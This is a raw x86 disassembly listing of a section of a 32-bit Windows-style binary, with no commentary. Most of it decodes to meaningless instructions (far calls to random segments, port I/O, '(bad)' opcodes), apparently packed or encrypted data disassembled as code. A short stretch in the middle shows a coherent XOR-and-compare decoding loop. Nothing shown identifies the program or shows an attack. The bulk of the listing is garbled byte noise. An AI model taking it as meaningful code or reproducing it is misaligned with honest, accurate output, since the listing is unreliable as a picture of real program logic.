  4049e1:	mov    DWORD PTR [eax-0x2555494],esp
  4049e7:	fmul   QWORD PTR es:[ebx+0x51eeec27]
  4049ee:	push   ebx
  4049ef:	mov    bl,0xf1
  4049f1:	push   ecx
  4049f2:	ror    dl,1
  4049f4:	pop    edi
  4049f5:	retf   
  4049f6:	jno    0x4049b5
  4049f8:	data16 es aas 
  4049fb:	push   es
  4049fc:	repz mov ebx,0x7cd92192
  404a02:	call   0x807e:0x57f2d7b3
  404a09:	in     al,0xec
  404a0b:	test   eax,0x67debbcf
  404a10:	out    dx,eax
  404a11:	or     cl,BYTE PTR [ecx-0x47]
  404a14:	sub    edi,DWORD PTR [edi+0x40]
  404a17:	mov    BYTE PTR [esi+0x2d],dl
  404a1a:	mov    al,ds:0xc194d3ae
  404a1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a20:	dec    ecx
  404a21:	push   0x9de92e21
  404a26:	xlat   BYTE PTR ds:[ebx]
  404a27:	test   al,0xb9
  404a29:	add    DWORD PTR [edx-0x6e],0xffffffc6
  404a2d:	mov    dh,0x6f
  404a2f:	jne    0x404a21
  404a31:	add    bh,BYTE PTR [ebp+0x37]
  404a34:	and    BYTE PTR [eax],ah
  404a36:	je     0x404a0d
  404a38:	xchg   ecx,eax
  404a39:	scas   al,BYTE PTR es:[edi]
  404a3a:	daa    
  404a3b:	and    dl,BYTE PTR [edx]
  404a3d:	(bad)  
  404a3e:	cdq    
  404a3f:	shr    BYTE PTR ds:0x1eb24ebb,cl
  404a45:	ret    0xedb3
  404a48:	push   ebx
  404a49:	stc    
  404a4a:	outs   dx,BYTE PTR ds:[esi]
  404a4b:	or     ch,dl
  404a4d:	test   BYTE PTR [edi+edx*2+0x16c4a8b7],bl
  404a54:	jmp    0x404a06
  404a56:	pop    esp
  404a57:	cmp    DWORD PTR [edx-0x17942b7d],ecx
  404a5d:	scas   al,BYTE PTR es:[edi]
  404a5e:	push   cs
  404a5f:	in     al,dx
  404a60:	test   DWORD PTR [esp+eax*8],0x4e0b1604
  404a67:	mov    ebp,0x7c95b699
  404a6c:	and    dl,0xd5
  404a6f:	xchg   esi,eax
  404a70:	inc    ebp
  404a71:	das    
  404a72:	aam    0x79
  404a74:	jmp    0xac45f76d
  404a79:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  404a7b:	ret    0x8e8f
  404a7e:	sti    
  404a7f:	imul   DWORD PTR [edx+0x66]
  404a82:	mov    ch,dh
  404a84:	call   0x20d7:0x316b1eeb
  404a8b:	push   edi
  404a8c:	push   ecx
  404a8d:	jp     0x404a7c
  404a8f:	dec    esi
  404a90:	jl     0x404a6e
  404a92:	sahf   
  404a93:	shl    BYTE PTR [edi],0x89
  404a96:	pop    ecx
  404a97:	dec    ecx
  404a98:	jmp    0x46c:0xe76d9cb2
  404a9f:	sbb    dh,BYTE PTR [ebx-0x31]
  404aa2:	jmp    0x404aa1
  404aa4:	call   0x2b56:0x33879cc5
  404aab:	std    
  404aac:	in     al,0x8
  404aae:	dec    ebp
  404aaf:	mov    ebx,0x64360bb0
  404ab4:	cmp    bh,bh
  404ab6:	push   ss
  404ab7:	and    BYTE PTR [edx+0x508ac234],0xa1
  404abe:	cdq    
  404abf:	mov    BYTE PTR [edx+0x4eebddf2],0x72
  404ac6:	shr    DWORD PTR [edx-0x6a],0x6a
  404aca:	cmp    eax,0xae081fc0
  404acf:	inc    ecx
  404ad0:	sub    al,0xaf
  404ad2:	sub    BYTE PTR [ecx],ch
  404ad4:	or     BYTE PTR [eax+0x1303df15],ah
  404ada:	in     al,dx
  404adb:	cmp    eax,eax
  404add:	dec    esi
  404ade:	jmp    0x26:0x145784fa
  404ae5:	xchg   DWORD PTR [ebp+0x67],eax
  404ae8:	pushf  
  404ae9:	mov    bl,0x2b
  404aeb:	test   eax,0x4b85efe2
  404af0:	ins    DWORD PTR es:[edi],dx
  404af1:	mov    ebx,0x71b1c335
  404af6:	push   ss
  404af7:	mov    DWORD PTR [ebp-0x3af7ec01],esi
  404afd:	mov    ah,0x74
  404aff:	xor    eax,0xb16caa18
  404b04:	jmp    0x404ab6
  404b06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b07:	aad    0x95
  404b09:	cld    
  404b0a:	adc    BYTE PTR [edi],bl
  404b0c:	sbb    DWORD PTR es:[eax-0x1848189],ebp
  404b13:	push   ebp
  404b14:	jmp    0x15d1e45e
  404b19:	jo     0x404b2c
  404b1b:	jns    0x404b50
  404b1d:	dec    edi
  404b1e:	inc    ecx
  404b1f:	enter  0x3702,0x10
  404b23:	pop    DWORD PTR gs:[ecx+0x5e19329f]
  404b2a:	stos   DWORD PTR es:[edi],eax
  404b2b:	mov    ch,0xd9
  404b2d:	xchg   ebx,eax
  404b2e:	add    BYTE PTR [edx+0x21],bl
  404b31:	push   esi
  404b32:	test   bh,dl
  404b34:	mov    eax,ds:0x1133ced
  404b39:	mov    edx,0x10a83e39
  404b3e:	out    dx,al
  404b3f:	aas    
  404b40:	jmp    0x13ce:0xb59ad0f7
  404b47:	cwde   
  404b48:	pop    edx
  404b49:	or     ebp,esp
  404b4b:	mov    BYTE PTR [ebx-0x6e7bc5b4],0xd5
  404b52:	jbe    0x404b86
  404b54:	scas   eax,DWORD PTR es:[edi]
  404b55:	fdiv   QWORD PTR [edx-0x9]
  404b58:	push   cs
  404b59:	jmp    0x783573aa
  404b5e:	pop    esp
  404b5f:	cwde   
  404b60:	fst    QWORD PTR [ebx]
  404b62:	test   BYTE PTR [esi+0x4e240a06],dh
  404b68:	mov    eax,ds:0xc1bb6f3f
  404b6d:	adc    al,0xb2
  404b6f:	push   es
  404b70:	jnp    0x404bc3
  404b72:	add    al,BYTE PTR [edx-0x3d]
  404b75:	in     ax,dx
  404b77:	loop   0x404b11
  404b79:	push   edi
  404b7a:	shl    DWORD PTR [edx+eax*2],1
  404b7d:	shr    ebp,1
  404b7f:	mov    ds:0x7ff6461c,eax
  404b84:	imul   BYTE PTR [esi]
  404b86:	nop
  404b87:	jmp    0xe6ecfc2a
  404b8c:	adc    al,0xca
  404b8e:	jns    0x404b73
  404b90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b91:	xchg   DWORD PTR [ebp-0x214bd200],eax
  404b97:	dec    edi
  404b98:	ds inc esi
  404b9a:	outs   dx,DWORD PTR ds:[esi]
  404b9b:	stos   BYTE PTR es:[edi],al
  404b9c:	inc    eax
  404b9d:	mov    edx,0x8a402ef1
  404ba2:	jecxz  0x404b89
  404ba4:	adc    ecx,DWORD PTR [esi]
  404ba6:	mov    cl,0xe3
  404ba8:	cld    
  404ba9:	adc    ecx,DWORD PTR [esi-0x66]
  404bac:	xchg   edi,eax
  404bad:	scas   eax,DWORD PTR es:[edi]
  404bae:	repnz mov ch,0x31
  404bb1:	xor    ebx,esp
  404bb3:	and    BYTE PTR [ebx-0x33],ch
  404bb6:	dec    eax
  404bb7:	iret   
  404bb8:	sub    ebx,0xffffffba
  404bbb:	or     bh,ch
  404bbd:	sub    DWORD PTR [edi+0x6f],edi
  404bc0:	mov    ebx,0x1ca154dc
  404bc5:	mov    edi,0x2a93a477
  404bca:	popf   
  404bcb:	sbb    BYTE PTR [edi],bh
  404bcd:	inc    esi
  404bce:	sub    DWORD PTR ds:0x28fa71da,edx
  404bd4:	jne    0x404bc3
  404bd6:	mov    bl,0x1e
  404bd8:	mov    WORD PTR [ebp+0x67],ss
  404bdb:	dec    edx
  404bdc:	ret    
  404bdd:	cld    
  404bde:	push   ecx
  404bdf:	in     al,dx
  404be0:	nop
  404be1:	sbb    eax,0x9c13adff
  404be6:	ficomp DWORD PTR [edx]
  404be8:	ret    0x9349
  404beb:	in     al,dx
  404bec:	jb     0x404ba6
  404bee:	out    dx,eax
  404bef:	lahf   
  404bf0:	lahf   
  404bf1:	jo     0x404c01
  404bf3:	stos   BYTE PTR es:[edi],al
  404bf4:	adc    dl,BYTE PTR [edx-0x3a8f9fa0]
  404bfa:	fadd   st,st(6)
  404bfc:	jae    0x404c56
  404bfe:	mov    eax,ds:0x7b47ef5b
  404c03:	or     esp,DWORD PTR [edx-0x4aa691b4]
  404c09:	add    BYTE PTR [ebx-0x45c3f24a],ah
  404c0f:	xchg   edx,eax
  404c10:	pop    eax
  404c11:	dec    esi
  404c12:	and    DWORD PTR [ebx+0x7075517d],ebp
  404c18:	mov    eax,0x1bbbb319
  404c1d:	shl    DWORD PTR [eax],1
  404c1f:	daa    
  404c20:	pop    ss
  404c21:	mov    cl,0x13
  404c23:	rcl    DWORD PTR [ebx-0x46],cl
  404c26:	sbb    edx,DWORD PTR [edx]
  404c28:	dec    ecx
  404c29:	push   eax
  404c2a:	mov    al,0x42
  404c2c:	xchg   ecx,eax
  404c2d:	mov    esp,0x5e516428
  404c32:	arpl   dx,ax
  404c34:	push   ds
  404c35:	cwde   
  404c36:	pop    ss
  404c37:	dec    edx
  404c38:	fstp   DWORD PTR [edx-0xef00290]
  404c3e:	pop    eax
  404c3f:	pop    eax
  404c40:	(bad)  
  404c41:	fmul   DWORD PTR [esi-0x27fa1954]
  404c47:	pop    ebp
  404c48:	jbe    0x404bdf
  404c4a:	sbb    ecx,ebx
  404c4c:	push   ecx
  404c4d:	mov    ebx,0xe5bbd71a
  404c52:	add    cl,BYTE PTR [esi-0x56387f35]
  404c58:	imul   esi,ebp,0xe8d74e92
  404c5e:	lods   al,BYTE PTR ds:[esi]
  404c5f:	cmp    dh,dh
  404c61:	push   es
  404c62:	retf   
  404c63:	mov    al,0xf0
  404c65:	pop    edx
  404c66:	stc    
  404c67:	bound  esi,QWORD PTR [eax-0x49]
  404c6a:	xor    DWORD PTR [edx-0x30],esp
  404c6d:	faddp  st(7),st
  404c70:	mov    esi,0xf03549d1
  404c75:	jo     0x404cca
  404c77:	in     eax,0x4a
  404c79:	or     esi,DWORD PTR [eax-0x3b]
  404c7c:	(bad)  
  404c7d:	sub    al,0xf8
  404c7f:	xchg   edi,eax
  404c80:	pop    ebx
  404c81:	ss mov dl,0xcd
  404c84:	xor    eax,0xfb05ba77
  404c89:	in     eax,0xd3
  404c8b:	test   BYTE PTR [ecx],cl
  404c8d:	je     0x404c1e
  404c8f:	aas    
  404c90:	xor    al,0x39
  404c92:	shl    BYTE PTR ds:0x8b113bc1,cl
  404c98:	sbb    ebx,DWORD PTR ds:0x1c5e4008
  404c9e:	sbb    esp,DWORD PTR [esi-0x39]
  404ca1:	test   eax,0x780b47f4
  404ca6:	in     eax,dx
  404ca7:	test   al,0x19
  404ca9:	and    eax,0x582cf200
  404cae:	shl    ch,0x36
  404cb1:	mov    ?,WORD PTR [ebp-0x44e3a4e4]
  404cb7:	ja     0x404c86
  404cb9:	jns    0x404c76
  404cbb:	inc    ecx
  404cbc:	fstp   TBYTE PTR [edi+0x30]
  404cbf:	js     0x404d0b
  404cc1:	mov    ds:0xf4d9c4d2,al
  404cc6:	jno    0x404d42
  404cc8:	mov    ah,0x4f
  404cca:	xor    eax,0x5f41c159
  404ccf:	sbb    al,0x9
  404cd1:	inc    esp
  404cd2:	pushf  
  404cd3:	(bad)  
  404cd4:	test   edx,edi
  404cd6:	add    eax,0xda9410b3
  404cdb:	(bad)  
  404cdc:	xchg   esi,eax
  404cdd:	xchg   ecx,eax
  404cde:	loope  0x404ce8
  404ce0:	lods   eax,DWORD PTR ds:[esi]
  404ce1:	lods   eax,DWORD PTR ds:[esi]
  404ce2:	jnp    0x404d1a
  404ce4:	lods   eax,DWORD PTR ds:[esi]
  404ce5:	shl    BYTE PTR [esi+esi*1+0x74],1
  404ce9:	pop    esi
  404cea:	xor    DWORD PTR [ebx],ecx
  404cec:	and    bh,BYTE PTR [esp+edi*1-0x6cecfd24]
  404cf3:	pop    es
  404cf4:	sub    al,0x74
  404cf6:	imul   ebx,DWORD PTR ds:0xa86a776b,0x697bf4de
  404d00:	cdq    
  404d01:	add    eax,0xe7244ef4
  404d06:	inc    ebp
  404d07:	ja     0x404c9b
  404d09:	mov    BYTE PTR [ebx],0xc7
  404d0c:	mov    DWORD PTR ds:0x42e6ff,0xe58
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e6eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax+0x2f]
  404d39:	jmp    0x2ed68cd0
  404d3e:	jo     0x404db0
  404d40:	cmp    eax,0x6570707d
  404d45:	inc    eax
  404d46:	and    dh,BYTE PTR [eax]
  404d48:	fs loop 0x404d4f
  404d4b:	adc    DWORD PTR [ebx-0x6b],ebx
  404d4e:	fcmovne st,st(2)
  404d50:	xchg   esp,eax
  404d51:	xchg   ebx,eax
  404d52:	or     BYTE PTR [eax],al
  404d54:	jmp    0x404d30
  404d56:	sub    DWORD PTR [ecx+eiz*4-0x294194ae],esi
  404d5d:	bnd ja 0x404d86
  404d60:	mov    dh,BYTE PTR [eax+0x71]
  404d63:	jmp    0x404d3f
  404d65:	mov    ah,0x45
  404d67:	int3   
  404d68:	jns    0x404dca
  404d6a:	jge    0x404d2a
  404d6c:	cmp    edi,esp
  404d6e:	mov    BYTE PTR [esi+0x598f86ec],0x9b
  404d75:	fld    DWORD PTR [edi+0x59]
  404d78:	aas    
  404d79:	cdq    
  404d7a:	in     eax,0x2f
  404d7c:	pop    edx
  404d7d:	repnz rcr DWORD PTR [eax],0x50
  404d81:	xchg   edi,eax
  404d82:	popa   
  404d83:	ja     0x404dc5
  404d85:	cld    
  404d86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d87:	sub    eax,0xc866b2aa
  404d8c:	scas   eax,DWORD PTR es:[edi]
  404d8d:	repnz cli 
  404d8f:	pop    ds
  404d90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d91:	jle    0x404d6f
  404d93:	aaa    
  404d94:	in     al,dx
  404d95:	fcmovnu st,st(1)
  404d97:	xor    DWORD PTR [ebp+0x72356c19],eax
  404d9d:	and    bh,0xf1
  404da0:	mov    edi,db7
  404da3:	mov    edx,0x4a72bd10
  404da8:	call   0xf4ffe1f8
  404dad:	jp     0x404d9f
  404daf:	cmp    DWORD PTR [esi+0x41c69b28],0xffffffba
  404db6:	imul   esi,DWORD PTR [ebx+0x8a14b05],0xbec6384
  404dc0:	jecxz  0x404dd2
  404dc2:	sbb    DWORD PTR [esi],esi
  404dc4:	sahf   
  404dc5:	scas   eax,DWORD PTR es:[edi]
  404dc6:	add    eax,0xe9db1913
  404dcb:	jle    0x404de9
  404dcd:	(bad)  
  404dce:	in     al,dx
  404dcf:	aaa    
  404dd0:	adc    al,0x41
  404dd2:	hlt    
  404dd3:	(bad)  
  404dd4:	dec    ecx
  404dd5:	hlt    
  404dd6:	in     eax,dx
  404dd7:	or     ebx,DWORD PTR [ecx+0x45163a5c]
  404ddd:	sbb    eax,0x66f78ffe
  404de2:	inc    ecx
  404de3:	div    BYTE PTR [edx]
  404de5:	aad    0x96
  404de7:	fild   DWORD PTR [esi-0xb91dc28]
  404ded:	stc    
  404dee:	cli    
  404def:	sub    al,0xd9
  404df1:	add    eax,0xa4c6985a
  404df6:	or     ah,BYTE PTR [edx+0x65dd4a48]
  404dfc:	jecxz  0x404e43
  404dfe:	mov    esp,0xb09cf983
  404e03:	cli    
  404e04:	mov    cl,0xe9
  404e06:	mov    esi,DWORD PTR [esi+0x3c]
  404e09:	outs   dx,DWORD PTR ds:[esi]
  404e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e0b:	pop    esp
  404e0c:	or     BYTE PTR [ebp+0x3d7a5fa8],0x85
  404e13:	call   0x8ee39066
  404e18:	stos   BYTE PTR es:[edi],al
  404e19:	jg     0x404e87
  404e1b:	jne    0x404e9b
  404e1d:	cmp    al,0x4b
  404e1f:	inc    ebx
  404e20:	(bad)  
  404e21:	call   0x3406:0x3327a745
  404e28:	jnp    0x404e98
  404e2a:	xchg   esp,eax
  404e2b:	fisub  WORD PTR [edi-0x3646ca78]
  404e31:	xchg   edi,eax
  404e32:	push   ss
  404e33:	cwde   
  404e34:	lds    ebx,FWORD PTR [ecx+0x5f]
  404e37:	xchg   edi,eax
  404e38:	mov    dl,0x3e
  404e3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e3b:	xor    DWORD PTR [esp+eiz*4+0x33],esi
  404e3f:	and    BYTE PTR [ecx-0x32],cl
  404e42:	or     eax,DWORD PTR [eax+eax*4-0x57182185]
  404e49:	push   edi
  404e4a:	in     al,dx
  404e4b:	cmc    
  404e4c:	mov    ebp,0x1d854504
  404e51:	cmp    ecx,DWORD PTR [ecx]
  404e53:	outs   dx,BYTE PTR ds:[esi]
  404e54:	aaa    
  404e55:	cld    
  404e56:	add    ch,BYTE PTR [edx]
  404e58:	cwde   
  404e59:	aam    0x64
  404e5b:	inc    edx
  404e5c:	shl    DWORD PTR [ebp+0x2bb6f072],1
  404e62:	aam    0x49
  404e64:	out    dx,al
  404e65:	lods   eax,DWORD PTR ds:[esi]
  404e66:	mov    ebp,?
  404e68:	mov    esp,0x9ae42f8e
  404e6d:	pop    es
  404e6e:	dec    eax
  404e6f:	rcr    BYTE PTR [esi+0x531d9685],cl
  404e75:	std    
  404e76:	div    DWORD PTR [esi]
  404e78:	mov    ebx,0x97d26ec6
  404e7d:	pop    ss
  404e7e:	sbb    al,0xe1
  404e80:	test   BYTE PTR [esi-0x46724105],0x3d
  404e87:	(bad)  
  404e89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e8a:	je     0x404e2e
  404e8c:	push   ds
  404e8d:	cdq    
  404e8e:	out    dx,eax
  404e8f:	push   cs
  404e90:	mov    dl,0x0
  404e92:	clc    
  404e93:	xchg   ebp,eax
  404e94:	outs   dx,BYTE PTR ds:[esi]
  404e95:	pop    esi
  404e96:	fld    TBYTE PTR ds:0x738d85f8
  404e9c:	adc    eax,0x6f109034
  404ea1:	je     0x404e85
  404ea3:	aaa    
  404ea4:	jbe    0x404e95
  404ea6:	push   ecx
  404ea7:	pop    ss
  404ea8:	sar    eax,cl
  404eaa:	mov    bh,0x95
  404eac:	mov    al,0xf4
  404eae:	clc    
  404eaf:	mov    BYTE PTR [ebp+0xc663fad],dh
  404eb5:	jbe    0x404e3f
  404eb7:	or     eax,DWORD PTR [esi+0x3f]
  404eba:	cs test al,0x83
  404ebd:	lods   al,BYTE PTR ds:[esi]
  404ebe:	dec    ebp
  404ebf:	ret    
  404ec0:	inc    edi
  404ec1:	pop    eax
  404ec2:	or     ebx,DWORD PTR [edi+ecx*4-0x4e]
  404ec6:	or     eax,ebx
  404ec8:	cld    
  404ec9:	in     eax,0x5a
  404ecb:	test   eax,esi
  404ecd:	div    BYTE PTR [edx-0x1e64440d]
  404ed3:	sbb    al,0xa9
  404ed5:	ret    0x833e
  404ed8:	mov    WORD PTR [ecx-0x2c],?
  404edb:	leave  
  404edc:	sbb    DWORD PTR [ebx],edx
  404ede:	das    
  404edf:	lods   eax,DWORD PTR ds:[esi]
  404ee0:	xchg   esp,eax
  404ee1:	xchg   ecx,eax
  404ee2:	imul   esi,DWORD PTR [eax+eax*1+0x79],0x14
  404ee7:	jp     0x404f3e
  404ee9:	push   0xffffffb4
  404eeb:	add    DWORD PTR [edi-0x77],0x6c
  404eef:	(bad)  
  404ef0:	sti    
  404ef1:	push   ebp
  404ef2:	ss ss or al,0xcf
  404ef6:	cmp    al,0xb0
  404ef8:	adc    DWORD PTR [esi-0x1697672],eax
  404efe:	inc    esi
  404eff:	dec    edx
  404f00:	test   BYTE PTR [edi],dl
  404f02:	mov    bh,0x5b
  404f04:	jb     0x404ec1
  404f06:	mov    ecx,0x29cc9e94
  404f0b:	jge    0x404f6c
  404f0d:	pop    ss
  404f0e:	mov    ebx,0x4e7f5f7e
  404f13:	pop    eax
  404f14:	mov    ds:0x799f41ae,al
  404f19:	repz aaa 
  404f1b:	xchg   esi,eax
  404f1c:	jge    0x404eb2
  404f1e:	inc    edi
  404f1f:	mov    edi,DWORD PTR [ecx-0x47c7a20]
  404f25:	inc    edi
  404f26:	jo     0x404f90
  404f28:	out    dx,eax
  404f29:	dec    ecx
  404f2a:	test   eax,0x4c2e7938
  404f2f:	pushf  
  404f30:	inc    eax
  404f31:	push   edi
  404f32:	pop    ebx
  404f33:	add    BYTE PTR [eax-0x33],dh
  404f36:	mov    ebp,0xb210e228
  404f3b:	shr    BYTE PTR [esi+ebx*4],cl
  404f3e:	xchg   ebp,eax
  404f3f:	outs   dx,DWORD PTR ds:[esi]
  404f40:	or     edx,DWORD PTR [ecx+0x22e1aec9]
  404f46:	and    al,0x9a
  404f48:	sar    ch,cl
  404f4a:	push   ecx
  404f4b:	out    dx,eax
  404f4c:	neg    BYTE PTR [edx]
  404f4e:	mov    dh,0x17
  404f50:	mov    al,0xfa
  404f52:	mov    ds:0x230bedee,al
  404f57:	ds push eax
  404f59:	and    esi,DWORD PTR [edi-0x4e]
  404f5c:	aas    
  404f5d:	fcmove st,st(0)
  404f5f:	xchg   esi,eax
  404f60:	push   ecx
  404f61:	in     al,0x8e
  404f63:	adc    DWORD PTR [ebx+0x4b],edi
  404f66:	ds jl  0x404f89
  404f69:	cmp    al,0x28
  404f6b:	sahf   
  404f6c:	fnsetpm(287 only) 
  404f6e:	sub    eax,0xd8bf11e0
  404f73:	(bad)  
  404f74:	jmp    0xd8c0a99
  404f79:	fadd   QWORD PTR [esi-0x372a9394]
  404f7f:	xor    al,0x64
  404f81:	push   ecx
  404f82:	and    DWORD PTR [edx+0x64],0x6c714009
  404f89:	fidiv  DWORD PTR [edi]
  404f8b:	pop    edx
  404f8c:	push   edi
  404f8d:	lea    eax,[ebp+ebx*4-0x5a]
  404f91:	xchg   BYTE PTR [ebp-0x3607e5e],dl
  404f97:	or     DWORD PTR [esi],esi
  404f99:	xchg   esi,eax
  404f9a:	add    DWORD PTR [edx-0x2c923c22],edx
  404fa0:	add    dl,cl
  404fa2:	in     eax,0xaf
  404fa4:	rcl    BYTE PTR [edi],1
  404fa6:	fwait
  404fa7:	mov    ebx,0x92527755
  404fac:	dec    ecx
  404fad:	jle    0x404fa8
  404faf:	sti    
  404fb0:	adc    al,0xbe
  404fb2:	js     0x404f52
  404fb4:	jns    0x404fd3
  404fb6:	xor    BYTE PTR [esi+0x28e2eefa],ah
  404fbc:	mov    edi,0x6fa1e879
  404fc1:	aad    0xc8
  404fc3:	jns    0x405026
  404fc5:	mov    cl,0x37
  404fc7:	add    esi,DWORD PTR [edi]
  404fc9:	mov    ah,0xeb
  404fcb:	xchg   ecx,eax
  404fcc:	frstor [esi+0x45]
  404fcf:	jnp    0x404ff7
  404fd1:	cmc    
  404fd2:	push   ebx
  404fd3:	sub    edi,eax
  404fd5:	pop    edx
  404fd6:	or     al,0xde
  404fd8:	mov    ch,BYTE PTR ds:0xe715bb
  404fde:	mov    cl,0x26
  404fe0:	shr    DWORD PTR [edi-0x1e],cl
  404fe3:	sub    eax,0xd8aa33de
  404fe8:	mov    ebp,0xbb9cabb1
  404fed:	sub    eax,DWORD PTR [edi+0x4e]
  404ff0:	ror    DWORD PTR [edx-0x32],0x23
  404ff4:	xor    eax,0x747f4a49
  404ff9:	sub    ecx,0xbf6a716a
  404fff:	mov    bl,0x73
  405001:	pusha  
  405002:	sbb    al,0x52
  405004:	add    eax,0x459c0541
  405009:	into   
  40500a:	pusha  
  40500b:	cs (bad) 
  40500d:	mov    edx,0x6fc5455d
  405012:	mov    esi,0x781509c6
  405017:	dec    esp
  405018:	jnp    0x405037
  40501a:	xchg   ecx,edx
  40501c:	add    BYTE PTR [edi-0x5d],cl
  40501f:	push   esp
  405020:	daa    
  405021:	mov    eax,0x16e44b25
  405026:	jmp    FWORD PTR [edi]
  405028:	(bad)  
  405029:	jmp    0x9332:0x85c21efd
  405030:	push   ss
  405031:	and    al,0x0
  405033:	add    al,0xad
  405035:	cmp    BYTE PTR [esi+edi*8],ah
  405038:	push   es
  405039:	jmp    0x16:0x5ba46eca
  405040:	mov    ds:0x3d241d2e,eax
  405045:	sbb    bh,BYTE PTR [edx+0x250c2311]
  40504b:	scas   eax,DWORD PTR es:[edi]
  40504c:	test   edx,0x6a120dcc
  405052:	mov    dh,0x1a
  405054:	push   es
  405055:	push   esp
  405056:	add    esp,DWORD PTR [edi+0x1a]
  405059:	iret   
  40505a:	ret    
  40505b:	jecxz  0x404fe8
  40505d:	retf   
  40505e:	add    al,0xa
  405060:	cdq    
  405061:	gs pop edx
  405063:	imul   ecx,ecx,0x4532ccaa
  405069:	adc    DWORD PTR cs:[esi+0x4664f92a],edx
  405070:	jp     0x405097
  405072:	xor    DWORD PTR [esi+0x3f1def4e],esp
  405078:	pop    eax
  405079:	es retf 0x3b78
  40507d:	jbe    0x405076
  40507f:	adc    BYTE PTR [ebx+0xc],al
  405082:	jnp    0x4050fe
  405084:	sbb    edx,esi
  405086:	dec    ebp
  405087:	mov    eax,DWORD PTR [ebp-0xc]
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	rcr    DWORD PTR [ecx],0xd8
  405133:	push   ebp
  405134:	xchg   esi,eax
  405135:	push   ebx
  405136:	sub    esi,DWORD PTR [eax+0x70]
  405139:	cmp    eax,0x1070707d
  40513e:	ror    dh,cl
  405140:	push   edi
  405141:	imul   DWORD PTR [edx+0x257a0757]
  405147:	xchg   edi,eax
  405148:	cmp    ebx,DWORD PTR [esi+0x20]
  40514b:	push   es
  40514c:	and    ch,ch
  40514e:	cli    
  40514f:	clc    
  405150:	mov    esi,0x25e9844f
  405155:	lea    esp,[edx]
  405157:	sub    al,0x58
  405159:	jmp    0xbd324abb
  40515e:	leave  
  40515f:	mov    dl,0xe
  405161:	or     dl,BYTE PTR [ebp+eax*4-0x1ebe34da]
  405168:	inc    ebx
  405169:	gs xchg edi,eax
  40516b:	fiadd  WORD PTR [edi]
  40516d:	xor    eax,0x41fc09ce
  405172:	push   0xb257b5fe
  405177:	adc    esp,edx
  405179:	jmp    0x6243:0x82fcebf1
  405180:	sahf   
  405181:	stos   DWORD PTR es:[edi],eax
  405182:	mov    esp,0x67dc517e
  405187:	xchg   ebp,eax
  405188:	ins    BYTE PTR es:[edi],dx
  405189:	in     al,0xd
  40518b:	sahf   
  40518c:	lds    edi,FWORD PTR [esi-0x1b9e89e1]
  405192:	out    0x76,al
  405194:	xchg   DWORD PTR [eax+ebp*4],esi
  405197:	loopne 0x405121
  405199:	and    eax,0xfc778793
  40519e:	test   DWORD PTR [edx-0x55],esp
  4051a1:	fsubrp st(1),st
  4051a3:	add    BYTE PTR [eax-0x63],dh
  4051a6:	mov    ds:0x28385362,eax
  4051ab:	loop   0x40522a
  4051ad:	adc    eax,0xc56bc703
  4051b2:	scas   eax,DWORD PTR es:[edi]
  4051b3:	es mov edx,0x501906a6
  4051b9:	sbb    DWORD PTR [edi],0x9346ed8d
  4051bf:	add    ebp,DWORD PTR [edi]
  4051c1:	fdivr  DWORD PTR [ebx]
  4051c3:	or     cl,BYTE PTR es:[eax-0x3b]
  4051c7:	or     ch,BYTE PTR [esi+0x6b]
  4051ca:	mov    dl,BYTE PTR [edi+eax*4]
  4051cd:	pop    esi
